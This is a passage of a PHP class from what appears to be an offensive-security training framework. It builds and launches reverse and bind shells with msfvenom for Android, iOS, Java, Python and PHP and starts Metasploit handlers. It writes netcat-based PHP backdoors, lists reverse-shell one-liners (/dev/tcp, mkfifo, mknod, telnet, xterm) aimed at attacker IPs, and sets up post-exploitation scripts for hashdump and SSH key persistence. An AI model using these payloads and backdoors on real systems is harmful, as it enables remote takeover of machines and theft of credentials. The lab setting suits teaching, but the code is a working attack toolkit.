        $this->requette("python -c 'import os;os.system(\"$shell\")' " );
        // python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));
        //  os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["$shell","-i"]);'
        
        // python/meterpreter/reverse_tcp
        // python/meterpreter/reverse_https
        // python/shell_reverse_tcp
        // python/meterpreter_reverse_tcp
        $this->ssTitre("Python" );
        $this->article("Enter Exit", "for exit" );
        $this->requette("python -c 'import pty;pty.spawn(\"$shell\")' " );
        $this->requette("python -c 'import os;os.system(\"$shell\")' " );
        $cmd2 = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8181));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$shell\",\"-i\"]);' ";
        $this->exec_parallel($cmd3, $cmd2, 1 );
        $this->pause();
        
        
    }
    

    
    
    
    
    
    
    public function rev8media_android($attacker_ip,$attacker_port,$shell) {
        $this->ssTitre(__FUNCTION__);
        $query = "msfvenom --payload android/meterpreter/reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -a dalvik --platform android --encoder x86/shikata_ga_nai --iterations 1 --format raw -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->prof,$query);
        $this->file_file2virus2vt(); // 44 / 57
        return $this;
    }
    
    public function rev8media_ios($attacker_ip,$attacker_port,$shell) {
        $this->ssTitre(__FUNCTION__);
        $query = "msfvenom --payload osx/armle/shell_reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -a armle --platform OSX --encoder x86/shikata_ga_nai --iterations 1 --format raw -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->prof,$query);
        $this->file_file2virus2vt(); // 44 / 57
        return $this;
    }
    
    
    
    
    public function rev8php_simple_reverse($attacker_ip,$attacker_port,$shell) {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($attacker_ip,"nc -l -p $attacker_ip -v");
        $query = "echo '<?php system(\"nc $attacker_ip $attacker_port -v -e $shell\")?>' > $this->file_path";
        if (!file_exists($this->file_path))$this->requette($query);
        else $this->cmd($attacker_ip,$query);
        $this->file_file2virus2vt();
        return $this;
    }
    
    
    
    public function rev8jar4rev8msf($attacker_ip,$attacker_port,$shell) {
        $this->ssTitre(__FUNCTION__);
        /*
         * Java:
         * r = Runtime.getRuntime()
         * p = r.exec(["$shell","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
         * p.waitFor()
         */
        $this->cmd($this->prof,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD java/shell_reverse_tcp ; set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
        $query = "msfvenom --payload java/shell_reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port --format jar -o $this->file_path ";
        if (!file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->prof,$query);
        $this->file_file2virus2vt();
        //$vmx = new vm($target);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd("Target","java -jar $this->file_path ");
        return $this;
    }
    
    
    
    public function rev8python_meterpreter($attacker_ip,$attacker_port,$shell) {
        $this->ssTitre(__FUNCTION__);
        // python/shell_reverse_tcp
        // msfvenom -p cmd/unix/reverse_python lhost=192.168.1.110 lport=4444 R
        $this->cmd($this->prof,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp ; set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
        $query = "msfvenom --payload  python/meterpreter/reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port --format raw -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->prof,$query);
        $this->file_file2virus2vt();
        //$vmx = new vm($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd("Target","python $this->file_path ");
        return $this; // 1 / 53
    }
    
    public function rev8python_netcat($attacker_ip,$attacker_port,$shell) {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->prof,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/shell_reverse_tcp ; set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
        $query = "msfvenom --payload  python/shell_reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port R --format raw -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->prof,$query);
        $this->file_file2virus2vt();
        //$vmx = new vm($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd("Target","python $this->file_path ");
        return $this;
    }
    
    public function rev8php_simple($attacker_ip,$attacker_port,$shell) {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->prof,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp ; set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
        $query = "msfvenom --payload  php/meterpreter/reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port  --format raw -o $this->file_path" ;
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->prof,$query);
        $this->file_file2virus2vt();
        //$vmx = new vm($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd("Target","php $this->file_path ");
        return $this;
    }
    
    
    
    public function rev8php_base64($attacker_ip,$attacker_port,$shell) {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->prof,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp ; set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
        $query = "msfvenom --payload  php/meterpreter/reverse_tcp LHOST='$attacker_ip' LPORT=$attacker_port --platform php --arch php -e php/base64 --format raw | tee $this->file_path.txt";
        if (! file_exists("$this->file_path.txt")) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path.txt " );}
        else $this->cmd($this->prof,$query);
        $backdoor = file_get_contents("$this->file_path.txt");
        $query = "echo '<?php $backdoor ?>' > $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->prof,$query);
        $this->file_file2virus2vt();
        //$vmx = new vm($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd("Target","php -f $this->file_path ");
        return $this;
    }
    
    public function rev8php_netcat($attacker_ip,$attacker_port,$shell) {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->prof,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD php/reverse_php ; set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
        $query = "echo '<?php' > $this->file_path;msfvenom --payload  php/reverse_php --platform php --arch php  LHOST=$attacker_ip LPORT=$attacker_port --format raw  >> $this->file_path ;echo '?>' >> $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->prof,$query);
        $this->file_file2virus2vt();
        //$vmx = new vm($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd("Target","php $this->file_path ");
        return $this;
    }
    
    

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    public function rev8simple_tools($attacker_ip,$attacker_port,$shell) {
        $this->titre("Netcat Backdoor");
        $this->ssTitre("Backdoor TCP avec netcat MODE bind");
        // tcpbind 8080 $shell -i
        // socat -,raw,echo=0 TCP:target:port,bind=:61040
        
        // exec $shell 0&0 2>&0
        // 0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
        
        // exec 5<>/dev/tcp/ATTACKING-IP/80
        // cat <&5 | while read line; do $line 2>&5 >&5; done
        // while read line 0<&5; do $line 2>&5 >&5; done
        
        // sh -i >& /dev/tcp/ATTACKING-IP/80 0>&1
        
        
        
        
        $this->cmd($this->msf, "nc -l -p 2345 -v -e $shell ");
        $this->cmd($this->prof, "nc $this->msf 2345 -v");
        $this->pause();
        $this->cmd($this->xp, "c:/ceh/nc.exe -l 2345 -v -e cmd -n ");
        $this->cmd($this->prof, "nc $this->xp 2345 -v");
        $this->note("If netcat doesn’t support -c or -e options (openbsd netcat) we can still create remote shell.");
        $this->pause();
        
        $this->ssTitre("Backdoor TCP avec netcat  MODE Reverse (NAT|firewall)");
        $this->cmd($this->prof, "nc -l 2345 -v "); // enlever le -p car c'est nc.openbsd dans ub
        $this->cmd($this->msf, "nc $this->prof 2345 -v -e $shell");
        $this->cmd($this->xp, "c:/ceh/nc.exe $this->prof 2345 -v -e cmd");
        $this->pause();
        
        $this->ssTitre("Backdoor UDP avec netcat MODE bind");
        $this->cmd($this->msf, "nc -l -u 2345 -v -e $shell ");
        $this->cmd($this->prof, "nc $this->msf 2345 -u -v");
        $this->pause();
        $this->cmd($this->xp, "c:/ceh/nc.exe -l 2345 -u -v -e cmd -n ");
        $this->cmd($this->prof, "nc $this->xp 2345 -u -v");
        $this->note("If netcat doesn’t support -c or -e options (openbsd netcat) we can still create remote shell.");
        $this->pause();
        
        $this->ssTitre("Backdoor UDP avec netcat  MODE Reverse (NAT|firewall)");
        $this->cmd($this->prof, "nc -l 2345 -u -v "); // enlever le -p car c'est nc.openbsd dans ub
        $this->cmd($this->msf, "nc $this->prof 2345 -v -u -e $shell");
        $this->cmd($this->xp, "c:/ceh/nc.exe $this->prof 2345 -u -v -e cmd");
        $this->pause();
        
        $this->ssTitre("Backdoor SSL Connection");
        $this->cmd($this->prof, "openssl req -new -x509 -keyout $this->file_dir/test-key.pem -out $this->file_dir/test-cert.pem");
        $this->cmd($this->prof, "ncat --listen 5544 --ssl --ssl-cert $this->file_dir/test-cert.pem --ssl-key $this->file_dir/test-key.pem");
        $this->cmd($this->lts, "ncat $this->prof 5544 --sh-exec \"$shell\" --ssl");
        $this->cmd($this->prof, "echo '$this->root_passwd' | sudo -S wireshark -i $this->eth_lan -k ");
        $this->pause();
        
        
        $cmd0 = "nc -lk 5555 -v";
        $cmd3 = "nc -lk 8181 -v";
        $cmd2 = "telnet prof 5555 | $shell | telnet prof 8181";
        
        $this->ssTitre("With telnet" );
        $this->cmd($this->host, $cmd0 );
        $this->cmd($this->host, $cmd3 );
        $this->cmd($msf, $cmd2 );
        $this->article("Fonctionnement", "Open 3 Windows, echo 'id' -> nc -lk 5555 -v -> see result on nc -lk 5555 -v\n" );
        $this->pause();
        
        $this->ssTitre("With mkfifo" );
        // mkfifo reverse
        // nc -l 2020 < reverse | nc localhost 22 > reverse
        $cmd2 = "mkfifo /tmp/tmp_fifo; cat /tmp/tmp_fifo | $shell | nc localhost 8181 > /tmp/tmp_fifo ";
        $this->exec_parallel($cmd3, $cmd2, 1 );
        $this->pause();
        
        $this->ssTitre("With mknod and netcat" );
        // rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
        $cmd2 = "mknod /tmp/tmp_pipe p; nc localhost 8181 0</tmp/tmp_pipe | $shell 1>/tmp/tmp_pipe ";
        $this->exec_parallel($cmd3, $cmd2, 1 );
        $this->pause();
        $this->ssTitre("With mknod and telnet" );
        $cmd2 = "mknod /tmp/tmp_pipe p; telnet localhost 8181 0</tmp/tmp_pipe | $shell 1>/tmp/tmp_pipe ";
        $this->exec_parallel($cmd3, $cmd2, 1 );
        $this->pause();
        
        $this->ssTitre("With /dev/tcp" );
        // sh -i >& /dev/tcp/10.211.55.3/6680 0>&1 2>&1
        $cmd2 = "$shell -i > /dev/tcp/127.0.0.1/8181 0<&1 2>&1 "; // sh -i >& /dev/tcp/127.0.0.1/8181 0>&1
        $this->exec_parallel($cmd3, $cmd2, 1 );
        $this->pause();
        
        $this->ssTitre("stdin/stdout" );
        $cmd2 = "0<&196;exec 196<>/dev/tcp/127.0.0.1/8181; sh <&196 >&196 2>&196";
        // nohup sh -i >& /dev/tcp/10.60.10.1/9999 0>&1
        $this->exec_parallel($cmd3, $cmd2, 1 );
        $this->pause();
        
        /*
         * xterm
         * One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
         * xterm -display 10.0.0.1:1
         * To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):
         * Xnest :1
         * You’ll need to authorise the target to connect to you (command also run on your host):
         * xhost +targetip
         *
         * xterm:
         * Xnest :1
         * Then remember to authorise on your system the target IP to connect to you:
         * xterm -display 127.0.0.1:1 # Run this OUTSIDE the Xnest
         * xhost +targetip # Run this INSIDE the spawned xterm on the open X Server
         * Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:
         * xterm -display attackerip:1
         * Or:
         * $ DISPLAY=attackerip:0 xterm
         *
         * It will try to connect back to you, attackerip, on TCP port 6001.
         * Note that on Solaris xterm path is usually not within the PATH environment variable, you need to specify its filepath:
         * /usr/openwin/bin/xterm -display attackerip:1
         */
        
        /*
        
        *
        * javascript:
        */
        
        
        
    }
    
    
    
    public function msf2search($cve){
        
        $this->ssTitre(__FUNCTION__);
        $cve = trim($cve);
        $sha1_hash = sha1($cve);
        $filename_req = "$this->dir_tmp/$sha1_hash.search.rc";
        $filename_rst = "$this->dir_tmp/$sha1_hash.search.rst";
        if (!empty($cve)){
            if (!file_exists($filename_req)){
                $query = "echo 'db_status\nsearch type:exploit -S $cve\nexit\n' > $filename_req";
                $this->requette($query);
            }
            if (!file_exists($filename_rst)){
            $query = "msfconsole -q  -r $filename_req | grep -i \"exploit/\" | awk '{print $2}' | grep \"exploit/\" | tee $filename_rst" ;
            return $this->req_ret_tab($query);
            }
            return file($filename_rst);
        }
        
        
        // set AutoRunScript multiconsolecommand -cl \"getsystem\",\"getuid\"
        // set AutoRunScript multi_console_command -rc $this->dir_tmp/$kio1_service_smb->ip.$kio1_service_smb->port.post_linux.rc
        // set AutoRunScript post/linux/gather/enum_system
        $query = "echo \"run post/linux/gather/enum_users_history\nrun post/linux/gather/enum_system\nrun post/linux/gather/enum_configs\nrun post/linux/gather/enum_network\nrun post/linux/gather/enum_protections\nrun post/linux/gather/hashdump\nrun post/linux/manage/sshkey_persistence\" > $this->dir_tmp/$this->ip.$this->port.post_linux.rc";
        //$this->requette($query);
        
        
    }
    
    public function msf2search2info($cve){
        $cve = trim($cve);
        $result = "";
        $files_exploit = array();
        $this->ssTitre(__FUNCTION__);
        $hash = sha1($cve);
        $file_rst = "$this->dir_tmp/$hash.info.rst";
        $files_exploit = array_filter($this->msf2search($cve)) ;
        if (!empty($files_exploit)){
            foreach ($files_exploit as $file_exploit){
                if(!empty($file_exploit)){
                    $file_exploit = trim($file_exploit);
            $this->article($cve, $file_exploit);
            $query = "msfconsole -q -x 'info $file_exploit;exit' | tee $file_rst " ;
            if (file_exists($file_rst)) return file_get_contents($file_rst);
            else return $this->req_ret_str($query);
           
            }
        }
        }
        return $result ;
    }
    
    
    function payload2check4norme($cmd, $badchars) {
        $cmd = str_replace('\\','#',$cmd);
        $cmd = str_replace('"','',$cmd);
        $cmd = str_replace("'",'',$cmd);
        $check_resu = "";
        exec("echo '$cmd' | grep -E 'x(".implode("|",$badchars).")' ",$check_resu);
        if (!empty($check_resu)) {
            $this->rouge("Will not Work On $cmd");
            return false;
        }
        return true;
    }
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
}

?>